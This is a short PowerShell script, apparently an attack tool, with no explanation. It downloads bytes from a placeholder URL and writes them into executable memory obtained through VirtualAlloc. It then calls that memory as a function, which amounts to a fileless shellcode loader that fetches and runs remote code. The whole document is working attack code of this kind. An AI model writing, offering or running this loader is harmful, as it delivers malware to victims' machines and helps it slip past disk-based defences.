$code = '[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d);'
$win = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
$marshal = [System.Runtime.InteropServices.Marshal]
$nil = [IntPtr].Zero
$x = Invoke-WebRequest -Uri "FILEURL" -UseBasicParsing
$p = $win::VirtualAlloc(0,$x.Content.Length * 2, 0x3000, 0x40);
$marshal::Copy($x.Content, 0, $p, $x.Content.Length)
$fn = $marshal::GetDelegateForFunctionPointer($p, [System.Action])
$fn.Invoke()
